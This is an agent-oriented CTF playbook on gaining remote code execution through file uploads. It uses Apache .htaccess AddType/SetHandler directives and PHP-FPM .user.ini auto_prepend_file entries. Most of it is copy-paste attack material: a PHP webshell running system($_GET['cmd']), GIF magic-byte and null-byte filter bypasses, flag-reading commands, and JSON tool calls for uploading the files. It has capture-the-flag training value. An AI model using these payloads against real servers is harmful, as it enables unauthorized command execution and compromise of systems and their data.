# Apache .htaccess and PHP Configuration Attacks

> **Document Purpose:** Actionable .htaccess and .user.ini attack techniques for CTF challenges. Designed for autonomous agent retrieval with copy-paste payloads, bypass methods, and exploitation workflows.

---

## 1. QUICK REFERENCE: .htaccess Attacks

> **When to use this section:** Target runs Apache and allows file uploads.

### 1.1 Understanding .htaccess

**Tags:** `htaccess, apache, config, file-upload, bypass`

**.htaccess files:**
- Apache per-directory configuration files
- Filename MUST be exactly `.htaccess` (with leading dot)
- Placed in web-accessible directories
- Requires `AllowOverride` to be enabled

**Key Point for CTFs:**
```
CRITICAL: The file MUST be named ".htaccess" exactly!
- "shell.htaccess" will NOT work
- ".htaccess.txt" will NOT work
- ".htaccess" is the ONLY valid name
```

**Agent Takeaway:**
- Upload file with exact name `.htaccess`
- Use upload_custom operation with filename=".htaccess"
- File must be in same directory as target files

---

### 1.2 Basic .htaccess Payloads

**Tags:** `htaccess, payload, php, handler, addtype`

**AddType - Treat images as PHP:**
```apache
AddType application/x-httpd-php .jpg
```

**AddType - Multiple extensions:**
```apache
AddType application/x-httpd-php .jpg .gif .png .txt
```

**SetHandler with FilesMatch:**
```apache
<FilesMatch "\.(jpg|gif|png)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

**AddHandler:**
```apache
AddHandler php-script .jpg
```

**php_value auto_prepend:**
```apache
php_value auto_prepend_file shell.jpg
```

**Agent Takeaway:**
- AddType is most reliable
- SetHandler with FilesMatch is more targeted
- php_value may be disabled

---

### 1.3 .htaccess Attack Workflow

**Tags:** `htaccess, workflow, file-upload, rce`

**Step-by-Step Attack:**
```
STEP 1: Identify file upload functionality
├── Check if images are accepted
└── Note the upload directory

STEP 2: Upload .htaccess file
├── Filename: .htaccess (EXACT)
├── Content: AddType application/x-httpd-php .jpg
└── Content-Type: text/plain

STEP 3: Upload PHP webshell with image extension
├── Filename: shell.jpg
├── Content: <?php system($_GET['cmd']); ?>
└── Content-Type: image/jpeg (for bypass)

STEP 4: Access the webshell
├── http://target/uploads/shell.jpg?cmd=id
└── http://target/images/shell.jpg?cmd=cat /flag.txt

STEP 5: Get the flag
└── cat /flag.txt, cat /home/*/flag*, etc.
```

**Agent Takeaway:**
- .htaccess must be uploaded FIRST
- Then upload webshell with matching extension
- Access webshell with command parameter

---

### 1.4 Adaptive Workflow (When Uploads Are Blocked)

**Tags:** `htaccess, adaptive, blocked, workflow, extension-change`

**CRITICAL: When you need to change shell extension, you MUST re-upload .htaccess!**

**Scenario: Initial extension blocked**
```
SITUATION: You uploaded .htaccess for .txt, but server blocks .txt uploads

WRONG APPROACH:
  1. Upload .htaccess with target_ext=".txt" ✓
  2. Upload shell.txt → BLOCKED ✗
  3. Upload shell.gif instead → SUCCESS ✓
  4. Access shell.gif?cmd=id → Returns raw PHP code! ✗

  WHY: Apache still configured for .txt, not .gif!

CORRECT APPROACH:
  1. Upload .htaccess with target_ext=".txt" ✓
  2. Upload shell.txt → BLOCKED ✗
  3. *** Upload NEW .htaccess with target_ext=".gif" *** ✓
  4. Upload shell.gif (with GIF89a header) → SUCCESS ✓
  5. Access shell.gif?cmd=id → RCE! ✓
```

**Decision Tree for Blocked Uploads:**
```
Shell upload blocked?
│
├─► Did you try a different extension?
│   │
│   ├─► YES: Did you re-upload .htaccess for the new extension?
│   │   │
│   │   ├─► YES: Verify shell execution (check if PHP code runs)
│   │   │
│   │   └─► NO: *** UPLOAD NEW .htaccess NOW! ***
│   │         file_upload_tool with:
│   │         - operation: "upload_htaccess"
│   │         - target_ext: "<new extension>"
│   │
│   └─► NO: Try these extensions in order: .gif, .jpg, .png
│           (with GIF89a or appropriate magic bytes)
│
└─► Is .htaccess itself blocked?
    │
    └─► Try .user.ini for PHP-FPM environments
```

**Agent Takeaway:**
- When shell extension changes, ALWAYS re-upload .htaccess
- Use `upload_htaccess` with the NEW target_ext
- Verify execution after each change
- If response shows raw PHP code, .htaccess doesn't match shell extension

---

## 2. .user.ini Attacks (PHP-FPM)

> **When to use this section:** Target uses PHP-FPM instead of Apache mod_php.

### 2.1 Understanding .user.ini

**Tags:** `userini, php-fpm, config, file-upload`

**.user.ini files:**
- PHP per-directory configuration (like .htaccess for PHP)
- Works on PHP-FPM and CGI/FastCGI
- Does NOT work on Apache mod_php
- Filename MUST be exactly `.user.ini`

**Key Difference from .htaccess:**
```
.htaccess → Apache configuration
.user.ini → PHP configuration

.user.ini works when:
- Server uses PHP-FPM
- Server uses CGI/FastCGI
- user_ini.cache_ttl allows updates (default: 300s)
```

**Agent Takeaway:**
- Try .user.ini if .htaccess fails
- Wait 5 minutes for changes to take effect
- Works on nginx + PHP-FPM setups

---

### 2.2 .user.ini Payloads

**Tags:** `userini, payload, auto-prepend, auto-append`

**Auto-prepend (execute shell before page):**
```ini
auto_prepend_file=shell.jpg
```

**Auto-append (execute shell after page):**
```ini
auto_append_file=shell.jpg
```

**Both prepend and append:**
```ini
auto_prepend_file=shell.jpg
auto_append_file=shell.jpg
```

**With specific path:**
```ini
auto_prepend_file=/var/www/uploads/shell.jpg
```

**Agent Takeaway:**
- auto_prepend_file is most common
- Shell executes on ANY PHP page access
- No need to access shell.jpg directly

---

### 2.3 .user.ini Attack Workflow

**Tags:** `userini, workflow, php-fpm, rce`

**Step-by-Step Attack:**
```
STEP 1: Upload .user.ini
├── Filename: .user.ini (EXACT)
├── Content: auto_prepend_file=shell.jpg
└── Upload to target directory

STEP 2: Upload PHP webshell
├── Filename: shell.jpg
├── Content: <?php system($_GET['cmd']); ?>
└── Same directory as .user.ini

STEP 3: Wait for cache refresh
└── Default: 300 seconds (5 minutes)

STEP 4: Access ANY PHP file in same directory
├── http://target/uploads/index.php?cmd=id
└── Shell code is auto-prepended

STEP 5: Get the flag
└── cat /flag.txt
```

**Agent Takeaway:**
- Upload both files to same directory
- May need to wait 5 minutes
- Access any PHP file, not the shell directly

---

## 3. DETECTION AND BYPASS

> **When to use this section:** .htaccess upload appears blocked.

### 3.1 Common Blocks and Bypasses

**Tags:** `htaccess, bypass, filter, evasion`

**Block: Filename filtering**
```
If server blocks ".htaccess":
- Try case variations: .HTACCESS, .Htaccess
- Try trailing characters: .htaccess%00, .htaccess.
- Try null byte: .htaccess%00.jpg
```

**Block: Content filtering**
```
If content is filtered:
- Use alternative directives
- Add comments to obfuscate
- Use hex encoding in values
```

**Block: Extension check only**
```
If only extension is checked:
- The filter may not check for leading dot
- May allow upload to specific directories
```

**Agent Takeaway:**
- Try case variations if blocked
- Some servers only check content, not filename
- Path traversal may help place file correctly

---

### 3.2 Verifying .htaccess Success

**Tags:** `htaccess, verify, debug, troubleshoot`

**Check if .htaccess is active:**
```
1. Upload .htaccess with:
   ErrorDocument 404 "HTACCESS_ACTIVE"

2. Access non-existent file:
   GET /uploads/nonexistent12345

3. If response contains "HTACCESS_ACTIVE":
   → .htaccess is being processed
```

**Check AllowOverride status:**
```apache
# In .htaccess:
Options +Indexes

# If directory listing appears:
→ AllowOverride includes Options
→ FileInfo directives (AddType) likely work
```

**Agent Takeaway:**
- Test .htaccess effectiveness before attack
- ErrorDocument is a quick test
- If Options works, AddType likely works too

---

## 4. CTF PLAYBOOK

> **When to use this section:** Solving file upload CTF with Apache hints.

### 4.1 .htaccess CTF Workflow

**Tags:** `htaccess, ctf, playbook, workflow`

**Complete Attack Sequence:**
```
1. IDENTIFY: File upload exists
   └── Check allowed file types

2. LOCATE: Find upload directory
   └── /uploads/, /images/, /files/

3. UPLOAD .HTACCESS:
   └── Filename: .htaccess
   └── Content: AddType application/x-httpd-php .jpg

4. UPLOAD WEBSHELL:
   └── Filename: shell.jpg
   └── Content: GIF89a<?php system($_GET['cmd']); ?>
   └── (GIF magic bytes for filter bypass)

5. EXECUTE:
   └── GET /uploads/shell.jpg?cmd=cat%20/flag.txt

6. CAPTURE FLAG:
   └── picoCTF{...} or similar
```

**Agent Takeaway:**
- Follow sequence: .htaccess first, then shell
- Add magic bytes to shell for extra bypass
- Check multiple potential upload directories

---

### 4.2 Decision Tree

**Tags:** `htaccess, decision-tree, workflow`

```
START: File upload challenge with Apache

TEST: Can upload .htaccess?
├── YES → Upload AddType payload
│   └── Upload shell.jpg
│       └── Execute: shell.jpg?cmd=id
│           ├── Works → Get flag
│           └── Returns PHP code → htaccess not active
│               └── Try .user.ini instead
│
└── NO → .htaccess blocked
    ├── Try upload_custom with exact filename
    ├── Try case variations (.HTACCESS)
    ├── Try null byte (.htaccess%00.txt)
    └── Try .user.ini instead

IF SHELL RETURNS CODE (not executed):
├── *** FIRST CHECK: Extension mismatch! ***
│   └── Did .htaccess target_ext match shell extension?
│       ├── .htaccess has .txt but shell is .gif → RE-UPLOAD .htaccess!
│       └── Use: upload_htaccess with target_ext matching shell
├── .htaccess not in right directory
├── AllowOverride disabled
├── File was renamed on upload
└── Try .user.ini for PHP-FPM

IF .user.ini:
├── Upload auto_prepend_file=shell.jpg
├── Upload shell.jpg with PHP code
├── Wait 5 minutes
└── Access any PHP file in same directory
```

**Agent Takeaway:**
- Always try .htaccess first on Apache
- Fall back to .user.ini for PHP-FPM
- Verify execution, don't assume success

---

## 5. COMMON MISTAKES

> **When to use this section:** Attack not working as expected.

### 5.1 Critical Mistakes to Avoid

**Tags:** `htaccess, mistakes, troubleshooting`

**Mistake 1: Wrong filename**
```
WRONG: shell.htaccess, htaccess.txt, .htaccess.jpg
RIGHT: .htaccess (exactly)

The leading dot is REQUIRED.
The name must be EXACTLY ".htaccess".
```

**Mistake 2: Wrong directory**
```
WRONG: .htaccess in / but shell in /uploads/
RIGHT: Both files in same directory

.htaccess only affects its directory and subdirectories.
```

**Mistake 3: Using form_submit instead of file upload**
```
WRONG: Sending .htaccess content as form field
RIGHT: Uploading as actual file with proper filename

Use multipart file upload, not form data.
```

**Mistake 4: Not checking execution**
```
WRONG: Assuming upload success means RCE
RIGHT: Verify PHP execution by checking response

If shell.jpg returns "<?php..." text, PHP isn't executing.
```

**Mistake 5: Extension mismatch between .htaccess and shell (CRITICAL)**
```
SCENARIO: You upload .htaccess targeting .txt, but .txt is blocked.
          You switch to uploading shell.gif instead.
          The shell returns raw PHP code instead of executing.

WHY IT FAILS:
  .htaccess says: AddType application/x-httpd-php .txt
  Shell file is:  shell.gif
  Apache has NO directive for .gif → serves as image!

CORRECT WORKFLOW:
  1. Upload .htaccess with target_ext=".txt"
  2. Try shell.txt → BLOCKED
  3. *** MUST upload NEW .htaccess with target_ext=".gif" ***
  4. Upload shell.gif → SUCCESS
  5. Execute shell.gif?cmd=id → RCE!

RULE: The .htaccess target extension MUST MATCH the shell extension!
```

**Agent Takeaway:**
- Filename must be EXACT
- Files must be in SAME directory
- Use proper file upload mechanism
- Verify execution before continuing
- **CRITICAL: If shell extension changes, RE-UPLOAD .htaccess with new target_ext!**

---

## 6. TOOL USAGE

> **When to use this section:** Using CTF solver tools for .htaccess attacks.

### 6.1 Using file_upload_tool

**Tags:** `tools, file-upload, htaccess`

**Upload .htaccess with exact filename:**
```json
{
  "operation": "upload_custom",
  "url": "http://target/upload.php",
  "file_param": "image",
  "filename": ".htaccess",
  "content": "AddType application/x-httpd-php .jpg"
}
```

**Automated .htaccess attack:**
```json
{
  "operation": "upload_htaccess",
  "url": "http://target/upload.php",
  "file_param": "image",
  "target_ext": ".jpg"
}
```

**Upload webshell after .htaccess:**
```json
{
  "operation": "upload_custom",
  "url": "http://target/upload.php",
  "file_param": "image",
  "filename": "shell.jpg",
  "content": "<?php system($_GET['cmd']); ?>"
}
```

**Generate .htaccess payloads:**
```json
{
  "operation": "generate_htaccess",
  "target_ext": ".jpg"
}
```

**Agent Takeaway:**
- Use upload_custom for exact filename control
- Use upload_htaccess for automated attack
- Follow up with shell upload and execution

---

## 7. SUMMARY

**Tags:** `htaccess, summary, quick-reference`

**.htaccess Quick Reference:**
```
Filename: .htaccess (exactly)
Location: Same directory as target files
Payload:  AddType application/x-httpd-php .jpg
Verify:   shell.jpg?cmd=id should show "uid=..."
```

**.user.ini Quick Reference:**
```
Filename: .user.ini (exactly)
Location: Same directory as target files
Payload:  auto_prepend_file=shell.jpg
Wait:     5 minutes for cache refresh
Access:   Any PHP file in same directory
```

**Attack Order:**
```
1. Try .htaccess (Apache)
2. If fails, try .user.ini (PHP-FPM)
3. Upload shell with matching extension
4. Execute and get flag
```
